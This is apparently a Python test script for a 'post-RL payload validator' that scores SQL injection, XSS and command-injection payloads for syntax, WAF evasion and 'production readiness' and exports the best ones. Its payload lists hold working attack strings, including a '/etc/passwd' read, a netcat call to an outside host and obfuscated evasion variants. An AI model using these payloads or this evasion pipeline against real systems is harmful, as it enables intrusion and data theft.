#!/usr/bin/env python3
"""
Test script for Advanced Post-RL Payload Validator
Shows sample output and quality metrics
"""

import sys
import json
from pathlib import Path

# Add current directory to path
sys.path.insert(0, str(Path(__file__).parent))

from advanced_post_rl_agent import AdvancedPostRLAgent, PayloadQuality


def test_sqli_payloads():
    """Test SQLi payload validation"""
    print("\n" + "="*80)
    print("🔍 TESTING SQL INJECTION PAYLOADS")
    print("="*80)
    
    sqli_payloads = [
        # Valid payloads
        "1' OR '1'='1",
        "1' UNION SELECT * FROM users --",
        "admin' OR 1=1 --",
        "1' AND SLEEP(5) --",
        "1' UNION SELECT extractvalue(1, concat(0x7e, database())) --",
        
        # Payloads with minor errors
        "1' OR '1'='1",  # Missing comment
        "1' UNION SELECT 1,2,3",  # Incomplete
        
        # Obfuscated payloads
        "1%27 OR %27%27=%27",
        "1' /*! UNION */ SELECT * FROM users --",
    ]
    
    # Initialize agent
    agent = AdvancedPostRLAgent(
        attack_type="sqli",
        min_combined_score=0.65,
        device="cpu"
    )
    
    # Process payloads
    print(f"\n📥 Processing {len(sqli_payloads)} SQLi payloads...\n")
    results = agent.process_batch(sqli_payloads, verbose=False)
    
    # Show detailed results
    print("DETAILED RESULTS:")
    print("-" * 80)
    
    for i, result in enumerate(results, 1):
        status_icon = "✓" if result.is_production_ready else "✗"
        quality_emoji = {
            PayloadQuality.EXCELLENT: "🌟",
            PayloadQuality.GOOD: "✅",
            PayloadQuality.ACCEPTABLE: "⚠️",
            PayloadQuality.POOR: "❌",
        }.get(result.quality_score.quality_level, "❓")
        
        print(f"\n[{i}] {status_icon} {quality_emoji} {result.quality_score.quality_level.value.upper()}")
        print(f"    Original:  {result.original_payload[:60]}")
        if result.original_payload != result.corrected_payload:
            print(f"    Corrected: {result.corrected_payload[:60]}")
        print(f"    Scores: Grammar={result.quality_score.grammar_score:.2f} | "
              f"Reward={result.quality_score.reward_score:.2f} | "
              f"Evasion={result.quality_score.evasion_score:.2f} | "
              f"Semantic={result.quality_score.semantic_score:.2f}")
        print(f"    Combined Score: {result.quality_score.combined_score:.4f}")
        print(f"    Syntax Valid: {result.syntax_check.is_valid} | "
              f"Syntax Errors: {len(result.syntax_check.errors)}")
        
        if result.corrections_applied:
            print(f"    Corrections: {', '.join(result.corrections_applied)}")
        
        if result.waf_evasion.obfuscation_techniques:
            print(f"    WAF Evasion: {', '.join(result.waf_evasion.obfuscation_techniques[:2])}")
        
        if result.rejection_reasons:
            print(f"    ⚠️  Rejection: {', '.join(result.rejection_reasons)}")
    
    # Print summary
    agent.print_summary()
    
    # Export results
    output_file = "outputs/test_sqli_results.json"
    Path(output_file).parent.mkdir(parents=True, exist_ok=True)
    export_data = agent.export_production_ready(output_file)
    
    return agent, export_data


def test_xss_payloads():
    """Test XSS payload validation"""
    print("\n" + "="*80)
    print("🔍 TESTING XSS PAYLOADS")
    print("="*80)
    
    xss_payloads = [
        # Valid payloads
        "<script>alert('XSS')</script>",
        "<img src=x onerror='alert(1)'>",
        "<svg onload=alert('xss')>",
        "<iframe src=javascript:alert(1)>",
        
        # Payloads with minor errors
        "<script>alert('xss')</scri>",  # Typo in closing tag
        "<img src=x onerror='alert(1)'",  # Missing >
        
        # Obfuscated payloads
        "<img src=x onerror='alert%281%29'>",
        "<svg/onload=alert('xss')>",
    ]
    
    # Initialize agent
    agent = AdvancedPostRLAgent(
        attack_type="xss",
        min_combined_score=0.65,
        device="cpu"
    )
    
    # Process payloads
    print(f"\n📥 Processing {len(xss_payloads)} XSS payloads...\n")
    results = agent.process_batch(xss_payloads, verbose=False)
    
    # Show detailed results
    print("DETAILED RESULTS:")
    print("-" * 80)
    
    for i, result in enumerate(results, 1):
        status_icon = "✓" if result.is_production_ready else "✗"
        quality_emoji = {
            PayloadQuality.EXCELLENT: "🌟",
            PayloadQuality.GOOD: "✅",
            PayloadQuality.ACCEPTABLE: "⚠️",
            PayloadQuality.POOR: "❌",
        }.get(result.quality_score.quality_level, "❓")
        
        print(f"\n[{i}] {status_icon} {quality_emoji} {result.quality_score.quality_level.value.upper()}")
        print(f"    Original:  {result.original_payload[:60]}")
        if result.original_payload != result.corrected_payload:
            print(f"    Corrected: {result.corrected_payload[:60]}")
        print(f"    Scores: Grammar={result.quality_score.grammar_score:.2f} | "
              f"Reward={result.quality_score.reward_score:.2f} | "
              f"Evasion={result.quality_score.evasion_score:.2f} | "
              f"Semantic={result.quality_score.semantic_score:.2f}")
        print(f"    Combined Score: {result.quality_score.combined_score:.4f}")
        print(f"    Syntax Valid: {result.syntax_check.is_valid} | "
              f"Syntax Errors: {len(result.syntax_check.errors)}")
        
        if result.corrections_applied:
            print(f"    Corrections: {', '.join(result.corrections_applied)}")
        
        if result.rejection_reasons:
            print(f"    ⚠️  Rejection: {', '.join(result.rejection_reasons)}")
    
    # Print summary
    agent.print_summary()
    
    # Export results
    output_file = "outputs/test_xss_results.json"
    Path(output_file).parent.mkdir(parents=True, exist_ok=True)
    export_data = agent.export_production_ready(output_file)
    
    return agent, export_data


def test_rce_payloads():
    """Test RCE payload validation"""
    print("\n" + "="*80)
    print("🔍 TESTING RCE PAYLOADS")
    print("="*80)
    
    rce_payloads = [
        # Valid payloads
        "; ls -la",
        "| whoami",
        "& id",
        "; cat /etc/passwd",
        "| nc 192.168.1.1 4444",
        
        # Payloads with errors
        "ls -la",  # No separator
        "; cat /etc/passwd'",  # Unbalanced quote
        
        # Obfuscated payloads
        "; l's -la'",  # Quote obfuscation
        "; echo 'hello'; whoami",
    ]
    
    # Initialize agent
    agent = AdvancedPostRLAgent(
        attack_type="rce",
        min_combined_score=0.60,
        device="cpu"
    )
    
    # Process payloads
    print(f"\n📥 Processing {len(rce_payloads)} RCE payloads...\n")
    results = agent.process_batch(rce_payloads, verbose=False)
    
    # Show detailed results
    print("DETAILED RESULTS:")
    print("-" * 80)
    
    for i, result in enumerate(results, 1):
        status_icon = "✓" if result.is_production_ready else "✗"
        quality_emoji = {
            PayloadQuality.EXCELLENT: "🌟",
            PayloadQuality.GOOD: "✅",
            PayloadQuality.ACCEPTABLE: "⚠️",
            PayloadQuality.POOR: "❌",
        }.get(result.quality_score.quality_level, "❓")
        
        print(f"\n[{i}] {status_icon} {quality_emoji} {result.quality_score.quality_level.value.upper()}")
        print(f"    Original:  {result.original_payload[:60]}")
        if result.original_payload != result.corrected_payload:
            print(f"    Corrected: {result.corrected_payload[:60]}")
        print(f"    Scores: Grammar={result.quality_score.grammar_score:.2f} | "
              f"Reward={result.quality_score.reward_score:.2f} | "
              f"Evasion={result.quality_score.evasion_score:.2f} | "
              f"Semantic={result.quality_score.semantic_score:.2f}")
        print(f"    Combined Score: {result.quality_score.combined_score:.4f}")
        print(f"    Syntax Valid: {result.syntax_check.is_valid} | "
              f"Syntax Errors: {len(result.syntax_check.errors)}")
        
        if result.corrections_applied:
            print(f"    Corrections: {', '.join(result.corrections_applied)}")
        
        if result.rejection_reasons:
            print(f"    ⚠️  Rejection: {', '.join(result.rejection_reasons)}")
    
    # Print summary
    agent.print_summary()
    
    # Export results
    output_file = "outputs/test_rce_results.json"
    Path(output_file).parent.mkdir(parents=True, exist_ok=True)
    export_data = agent.export_production_ready(output_file)
    
    return agent, export_data


def main():
    """Run all tests"""
    print("\n" + "🚀 "*20)
    print("ADVANCED POST-RL PAYLOAD VALIDATOR - QUALITY TESTING")
    print("🚀 "*20)
    
    # Create output directory
    Path("outputs").mkdir(exist_ok=True)
    
    # Test SQLi
    try:
        agent_sqli, export_sqli = test_sqli_payloads()
        sqli_success = True
    except Exception as e:
        print(f"\n❌ SQLi test failed: {e}")
        sqli_success = False
    
    # Test XSS
    try:
        agent_xss, export_xss = test_xss_payloads()
        xss_success = True
    except Exception as e:
        print(f"\n❌ XSS test failed: {e}")
        xss_success = False
    
    # Test RCE
    try:
        agent_rce, export_rce = test_rce_payloads()
        rce_success = True
    except Exception as e:
        print(f"\n❌ RCE test failed: {e}")
        rce_success = False
    
    # Final summary
    print("\n" + "="*80)
    print("📊 OVERALL TEST SUMMARY")
    print("="*80)
    
    test_results = {
        "SQLi": sqli_success,
        "XSS": xss_success,
        "RCE": rce_success,
    }
    
    for attack_type, success in test_results.items():
        status = "✅ PASSED" if success else "❌ FAILED"
        print(f"  {attack_type:10} {status}")
    
    print("\n✨ All tests completed!")
    print(f"📁 Results saved to: outputs/")
    print(f"   - outputs/test_sqli_results.json")
    print(f"   - outputs/test_xss_results.json")
    print(f"   - outputs/test_rce_results.json")
    print("\n" + "="*80 + "\n")


if __name__ == "__main__":
    main()
